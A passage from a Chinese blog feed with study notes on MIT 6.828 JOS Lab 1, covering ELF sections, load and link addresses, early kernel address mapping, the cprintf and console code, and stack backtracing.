loader的工作就是把它们加载到内存中。</p><p>一个ELF文件，开始处是一个固定长度的ELF文件头，后面紧跟着一个程序段表，这个段表中列出了要加载到内存的所有段。关于ELF文件头的格式在inc/elf.h文件中由声明。在6.828中我们对三个段非常感兴趣：</p><ul><li>.text段：存放所有可执行代码。</li><li>.rodata段：存放程序所有只读数据的数据段，比如字符串常量。</li><li>.data段：存放所有被初始化过的数据段，比如有初始值的全局变量。</li></ul><p>当链接器在计算整个程序的内存布局时，它会为未初始化的全局变量，比如int x，在一个紧跟在.data段后的段，.bss段中保留它们的信息。C语言要求所有没有被初始化的变量值为0。因而我们并不需要在ELF文件中存放这些变量的值，因为它们一定是0。因此链接器知识把这些变量的地址和大小存放在.bss段中。只有当程序装入内存后，由装入器为这些段赋予初值0。</p><p>我们可以通过下面的命令来查看JOS内核中所有段的名字，大小和地址</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -h kernel</span></span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13111778464/0" alt="image-20210131003630740"></p><p>在图中我们会发现这个可执行文件的所有段的信息，其中不仅仅包括我们之前提到的那四个段，还有一些其他的，它们主要用于存放一些debug信息等。</p><p>在每一个段中都有两个比较重要的字段，VMA（链接地址），LMA（加载地址）。其中加载地址代表的就是这个段被加载到内存中后，它所在物理地址。链接地址则指的是这个段希望被存放到的逻辑地址。</p><p>每一个ELF文件中都有一个Program Headers Table，用于指明ELF文件中哪些部分被加载到内存，以及被加载到内存中的地址。可以通过下面的指令获取kernel的Program Headers Table的信息：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -x obj/kern/kernel</span></span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13111796577/0" alt="image-20210131004606790"></p><p>其中Program Header中列出的是所有被加载在内存中的段的信息，这也是Program Headers Table的表项。每一个表项图中都把这个表项中涉及到的所有字段都列出来了。可见有一些段最后没有被加入到内存之中。上图中，那些需要被加载到内存的段被标记为LOAD。</p><p>BIOS通常会把boot sector加载到内存地址0x7c00处，这是boot sector的加载地址，也是boot sector的链接地址。我们可以通过boot/Makefrag文件中的-Ttext 0x7c00语句设置boot sector的链接地址，并且这个链接地址后来会被链接器所使用，保证链接器产生正确的代码。</p><p>再次回顾下内核的加载地址和链接地址。与boot loader不同，内核的这两个地址是不同的。内核告诉boot loader把它加载到低地址处（加载地址），但是它希望运行在高地址处（链接地址）。个人理解就是加载地址其实就是物理地址，物理地址大家都是唯一的，然后链接地址是虚拟地址，虚拟地址可以有相同，但是解析成最后的物理地址肯定是唯一的。我们在下一章细看这个问题。</p><p>除了各个段的信息，在ELF头部中，还有一个非常重要的信息就是e_entry字段。这个字段存放的是这个可执行程序的入口处的链接地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13111833495/0" alt="image-20210131012003293"></p><p>可见内核程序的入口地址为0x0010000c，这个地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13111839005/0" alt="image-20210131012654935"></p><p>查看之前的e_entry字段，可以发现这个地址与我们查询的相同。</p><h2 id="Part-3-The-Kernel"><a href="#Part-3-The-Kernel" class="headerlink" title="Part 3: The Kernel"></a>Part 3: The Kernel</h2><p>现在我们将具体谈论一下JOS内核。就像boot loader一样，内核开始的时候也是一些汇编语句，用于设置一些东西，来保证C程序能够正确执行。</p><h3 id="Using-virtual-memory-to-work-around-position-dependence"><a href="#Using-virtual-memory-to-work-around-position-dependence" class="headerlink" title="Using virtual memory to work around position dependence"></a>Using virtual memory to work around position dependence</h3><p>在运行boot lodaer时，boot loader的链接地址（虚拟地址）和加载地址（物理地址）是一样的。但是当进入内核程序后，这两种地址就不再相同了。</p><p>操作系统内核程序在虚拟地址空间通常会被链接到一个非常高的虚拟地址空间处，比如0xf0100000，目的就是能够让处理器的虚拟地址空间的低地址部分能够被用户利用来进行编程。</p><p>但是许多的机器其实并没有能够支持0xf0100000这种地址那么大的物理内存，所以我们不能把内核的0xf0100000虚拟地址映射到物理地址0xf0100000的存储单元处。</p><p>这就造成了一个问题，在我们编程时，我们应该把操作系统放在高地址处，但是在实际的计算机内存中却没有那么高的地址，这该怎么办？</p><p>解决方案就是在虚拟地址空间中，我们还是把操作系统放在高地址处0xf0100000，但是在实际的内存中我们把操作系统存放在一个低的物理地址空间中，如0x00100000。那么当用户程序向访问一个操作系统内核的指令时，首先给出的是一个高的虚拟地址，然后计算机中通过某个机构把这个虚拟地址映射为真实的物理地址，这就解决了上面的问题。那么这种机构通常就是通过分段管理，分页管理来实现的。</p><p>在实验中，首先是采用分页管理的方法来实现上面所讲述的地址映射。但是设计者实现的映射的方式并不是通常计算机所采用的分页管理机构，而是自己手写了一个程序<code>lab/kern/entrygdir.c</code>用于进行映射。既然是手写的，所以它的功能就很有限，只能够把虚拟地址空间的地址范围：<code>0xf0000000 ~ 0xf0400000</code>，映射到物理地址范围：<code>0x00000000 ~ 0x00400000</code>上面。也可以把虚拟地址范围：<code>0x00000000 ~ 0x00400000</code>，同样映射到物理地址范围：<code>0x00000000 ~ 0x00400000</code>上面。任何不再这两个虚拟地址范围内的地址都会引起一个硬件异常。虽然只能映射这两块很小的空间，但是已经足够刚启动程序的时候来使用了。</p><h3 id="Formatted-Printing-to-the-Console"><a href="#Formatted-Printing-to-the-Console" class="headerlink" title="Formatted Printing to the Console"></a>Formatted Printing to the Console</h3><p>我们经常会在编程时使用到printf子程序，这个子程序是在操作系统的内核中实现的。这一小部分就是要探究一下这种格式化输出子程序的实现方式。</p><p>通读kern/printf.c，lib/printfmt.c和kern/console.c三个C语言程序，并且确保你能够理解他们之间的关系。在后边的实验中我们会弄清楚为什么printfmt.c子程序会放在lib文件夹下。</p><p>回答下Exercise 8后面的问题：</p><ol><li><p>解释一下printf.c和console.c两个之间的关系。console.c输出了哪些子函数？这些函数是怎么被printf.c所利用的。</p><p>在exercise8的解答中我们知道了，console.c中除了被static修饰符修饰的函数外，都可以被外部所使用，其中printf所使用的函数就是cputchar子函数。</p></li><li><p>解释一下console.c文件中，下面这段代码的含义：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>      <span class="keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;</span><br><span class="line"><span class="number">2</span>              <span class="keyword">int</span> i;</span><br><span class="line"><span class="number">3</span>              memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</span><br><span class="line"><span class="number">4</span>              <span class="keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)</span><br><span class="line"><span class="number">5</span>                      crt_buf[i] = <span class="number">0x0700</span> | <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="number">6</span>              crt_pos -= CRT_COLS;</span><br><span class="line"><span class="number">7</span>      &#125;</span><br></pre></td></tr></table></figure><p>首先下一下几个变量。</p><p><code>crt_buf</code>：这是一个字符数组缓冲区，里面存放着要显示到屏幕上的字符。</p><p><code>crt_pos</code>：这个表示当前最后一个字符显示在屏幕上的位置。在介绍这个变量前，我们要知道早期的计算机如果想显示信息给用户只能通过文字模式。那么这个console.c源程序中考虑的就是一种非常常见的文字模式，80x25文字模式，即整个屏幕上允许显示最多25行字符，每行最多显示80个字符。所以一共代表了80x25个位置。当我们要显示某个特定字符到屏幕某个位置上面时，我们必须要指定显示的位置，和显示字符给屏幕驱动器cga。</p><p>而cga_putc（int c）就是完成这项功能，把字符c显示到屏幕当前显示的下一个位置。比如当前屏幕中已经显示了三行数据，并且第三行已经显示了40个字符，此时执行cga_puta（0x65），那么就会把0x65对应的字符’A’显示到2行第41个字符处。所以cga_putc需要两个变量，crt_buf，这个字符数组指针，该字符</p><p>数组就是当前显示在屏幕上的所有字符。crt_pos则表示下一个要显示的字符存放在数组中的位置，其实通过这个值也可以推导出它显示在屏幕上的位置。比如crt_pos = 85，那么它就应该显示在第2行（即1号行），第6字符（5号字符）处。所以crt_pos的取值范围应该是从0~(80*25-1)。</p><p>当crt_pos &gt;= CRT_SIZE，其中CRT_SIZE=80*25，由于我们知道crt_pos取值范围是0 <del>（80 * 25 - 1），那么这个条件如果成立则说明现在在屏幕上输出的内容已经超过了一页。所以此时要把页面向上滚动一行。所以memmove操作就是把crt_buf字符数组中1</del>79行的内容复制到0~78行的位置上，for循环就是把最后一行都变成空格，当然第0号要显示输入的字符c，最后修改crt_pos的值。</p></li><li><p>观察下面的一串代码，回答下面问题：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">1</span>, y = <span class="number">3</span>, z = <span class="number">4</span>;</span><br><span class="line">cprintf(<span class="string">&quot;x %d, y %x, z %d\n&quot;</span>, x, y, z);</span><br></pre></td></tr></table></figure><ul><li>当调用cprintf时，fmt指向的是什么内容，ap指向的是什么内容。</li><li>按照执行的顺序列出所有对cons_putc, va_arg，和vcprintf的调用。对于cons_putc，列出它所有的输入参数。对于va_arg列出ap在执行完这个函数后的和执行之前的变化。对于vcprintf列出它的两个输入参数的值。</li></ul><p>fmt指向显示信息的格式字符串，那么在这段代码中，它指向的就是”x %d, y %x, z %d\n”字符串，而ap是va_list类型的，所以指向所有输入参数的集合。我们发现cprintf调用了vcprintf函数，并且把格式字符串fmt，以及所有的参数列表ap（包含x，y，z）作为输入参数传给了vcprintf，然后vcprintf调用了vprintfmt子程序，并且传递给它4个参数。第一个参数是显示字符的子程序：这里采用的是printf.c文件中自己定义的putch函数。这个函数可以把字符显示到屏幕上。然后在传递一个值为0的变量的引用给第2个参数。原本第2个参数的含义是一个内存地址，并且第1个参数函数指针所指向的函数应该能够把字符写入到第2个参数所指定的地址处。但是由于我们的第1个参数是显示数据到屏幕。所以这里不需要第2个参数了。所以此时我们把一个变量引用作为第2个参数，是把它当做计数器，记录显示了多少字符。第3,4字符的含义没有变，和cprintf的参数一样。</p><p>然后进入vprintfmt子程序。这个子程序我们已经分析过。这里就不再赘述了。这个子程序的工作过程就是，不停的分析格式字符串fmt。分析采取的方式是把格式字符串划分成多个部分，每个部分都至多带有一个待显示的参数，比如我们这道题中的格式字符串就可以被划分为4个部分：”x %d”， “, y %x” , “, z %d”, “\n”。</p><p>然后先分析每个部分中%号前面的字符串，并且直接输出。比如”x %d”中”x “。然后分析%号后面的内容，比如”x %d”中分析的结果就是要按照10进制显示一个参数。每当分析完%号后面的内容，程序就会按照分析的结果来进行不同的操作。在分析完”x %d”后，代码开始执行下面这个分支：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">   num = getint(&amp;ap, lflag); <span class="comment">//根据你的整数类型到底是int，还是long，还是long long，从参数列表ap中取出相应类型的参数</span></span><br><span class="line">   <span class="keyword">if</span> ((<span class="keyword">long</span> <span class="keyword">long</span>) num &lt; <span class="number">0</span>) &#123; <span class="comment">//如果输入参数是负数，先输出一个负号</span></span><br><span class="line">      putch(<span class="string">&#x27;-&#x27;</span>, putdat);</span><br><span class="line">      num = -(<span class="keyword">long</span> <span class="keyword">long</span>) num;</span><br><span class="line">   &#125;</span><br><span class="line">   base = <span class="number">10</span>;</span><br><span class="line">   <span class="keyword">goto</span> number;</span><br></pre></td></tr></table></figure><p>这个分支首先是一个子函数getint，代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> <span class="keyword">long</span></span><br><span class="line">getint(va_list *ap, <span class="keyword">int</span> lflag)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">if</span> (lflag &gt;= <span class="number">2</span>)</span><br><span class="line">      <span class="keyword">return</span> va_arg(*ap, <span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (lflag)</span><br><span class="line">      <span class="keyword">return</span> va_arg(*ap, <span class="keyword">long</span>);</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> va_arg(*ap, <span class="keyword">int</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见它根据不同的参数类型，利用va_arg方法从ap参数列表中取出下一个参数，在我们的例子中会执行<code>return va_arg(*ap, int)</code>。这里对va_arg进行了一次调用，调用前ap中包括x，y，z三个参数的内容：1，3，4。调用完剩下3，4。</p><p>回到vprintfmt，现在num中存放的是待显示的值1。下一步判断这个值是否为负数，如果是负数，先调用putch显示一个负数在屏幕上。然后跳转到number处。</p><p>number处是一个子程序 printnum(putch, putdat, num, base, width, padc)，这个子程序会按照指定的进制，以及格式显示你刚刚取到的参数1。在这个子程序中我们可以看到它会把你取到的参数值（num = 1）按照你所指定的进制（base = 10），一位一位的显示出来。所以每得到一位的值它都会调用一次putch，把它显示到屏幕上。另外这句代码putch(padc, putdat);是为了实现当显示需要右对齐时，应该先把左边补上空格。所以这样第1个参数x=1就是显示在屏幕上了，后面的两个也是同样的道理。</p></li><li><p>运行下面的代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0x00646c72</span>;</span><br><span class="line">cprintf(<span class="string">&quot;H%x Wo%s&quot;</span>, <span class="number">57616</span>, &amp;i);</span><br></pre></td></tr></table></figure><p>输出是什么？为什么是这样的输出？</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13127955181/0" alt="image-20210203170947538"></p><p>为什么会这样，首先我们看下第一个%x，指的是按照16进制输出第一个参数，第一个参数的值是57616，它对应的16进制的表示形式为e110，所以前面就变成了He110。然后看下一个%s，输出参数所指向的字符串，参数是&amp;i，是变量i的地址，所以应该输出的是变量i所在地址处的字符串。而在cprintf之前我们把i定义为一个int类型变量，所以现在我们要把它们进行拆分，按照一个字节一个字节来进行输出。</p><p>由于x86是小端模式，代表字的最高位字节存放在最高位字节地址上。假设i变量的地址为0x00，那么i的4个字节的值存放在0x00，0x01，0x02，0x03四处。由于是小端存储，所以0x00处存放0x72(‘r’)，0x01处存放0x6c(‘l’)，0x02处存放0x64(‘d’)，0x03处存放0x00(‘\0’)。</p><p>所以在cprintf将会从i的地址开始一个字节一个字节遍历，正好输出 “World</p></li><li><p>看下面代码，在’y=’后面会输出什么，为什么会这样</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cprintf(<span class="string">&quot;x=%d y=%d&quot;</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13127981014/0" alt="image-20210203171441302"></p><p>由于y没有参数被指定，会是输出一个不确定的值。</p></li></ol><h3 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h3><p>在本实验的最后一部分，我们将探讨一下C语言是如何在x86机器上使用堆栈的。并且我们还会重新编写一个新的kernel monitor子程序。这个程序可以记录堆栈的变化轨迹：轨迹是由一系列被保存到堆栈的IP寄存器的值组成的，之所以会产生这一系列被保存的IP寄存器的值，是因为我们执行了一个程序，程序中包括一系列嵌套的call指令。</p><p><strong>%esp寄存器</strong>指向的是整个堆栈中正在被使用的部分的最低地址。在这个地址之下的更低的地址空间都是还没有被利用的堆栈空间。当计算机要完成把一个值压入堆栈的动作时，通常它需要先把堆栈指针寄存器中的值减1（有时候是减4，由机器字长决定），然后把需要压入的值存放到当前堆栈指针寄存器所指向的新的内存单元。而从堆栈中弹出一个值的操作，则需要计算机首先从堆栈寄存器所指向的内存单元读取一个数据，然后把堆栈寄存器的值加1（有时候是加4）。在32bit模式下，每一次对堆栈的操作都是以32bit为单位的，所以%esp中的值永远都是可以被4整除的。</p><p><strong>ebp寄存器</strong>则是记录每一个程序的栈帧的相关信息的一个非常重要的寄存器。每一个程序在运行时都会分配给它一个栈帧，用于实现存放一些临时变量，传递参数给它调用的子函数等等功能。当现在进入某个子程序时，最先要运行的代码就是先把之前调用这个子程序的程序的ebp寄存器的值压入堆栈中保存起来，然后把ebp寄存器的值更新为当前esp寄存器的值。此时就相当于为这个子程序定义了它的ebp寄存器的值，也就是它栈帧的一个边界。只要所有的程序都遵循这样的编程规则，那么当我们运行到程序的任意一点时。我们可以通过在堆栈中保存的一系列ebp寄存器的值来回溯，弄清楚是怎样的一个函数调用序列使我们的程序运行到当前的这个点。</p><p> 到目前为止，你所编写的backtrace函数应该能够把导致mon_backtrace()函数执行的所有函数的地址信息打印出来了。但是在实际情况中，你经常会向弄清楚这些地址对应的到底是哪个函数。 为了达到这个目的，课程已经提供了一个函数 debuginfo_eip()，这个函数将会标识表（symbol table）中查找eip的值，然后显示出来关于这个eip的值相关的调试信息。这个函数定义在kern/kdebug.c文件中。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Part-1-PC-Bootstrap&quot;&gt;&lt;a href=&quot;#Part-1-PC-Bootstrap&quot; class=&quot;headerlink&quot; title=&quot;Part 1: PC Bootstrap&quot;&gt;&lt;/a&gt;Part 1: PC Bootstrap&lt;/h2&gt;&lt;h3
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
</feed>
